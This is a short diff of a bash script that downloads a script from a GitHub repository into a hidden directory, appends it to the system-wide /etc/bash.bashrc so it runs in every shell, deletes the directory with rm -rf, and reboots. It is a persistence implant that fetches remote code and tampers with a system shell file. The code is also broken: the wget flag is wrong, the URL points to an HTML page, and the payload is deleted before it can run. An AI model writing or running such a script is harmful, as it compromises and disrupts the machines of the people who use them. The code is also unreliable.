@@ -1,5 +1,9 @@
 #!/bin/bash
 
-wget -0 alphabet_cereal.txt https://github.com/P0nt14c/alphabet_cereal/blob/master/inputrc_update
+wget -0 /home/.hidden/alphabet_cereal.sh https://github.com/P0nt14c/alphabet_cereal/blob/master/methods.sh
 
-echo alphabet_cereal.txt > /etc/bash.bashrc
+echo /home/.hidden/alphabet_cereal.sh >> /etc/bash.bashrc
+
+rm -rf /home/.hidden/
+
+reboot
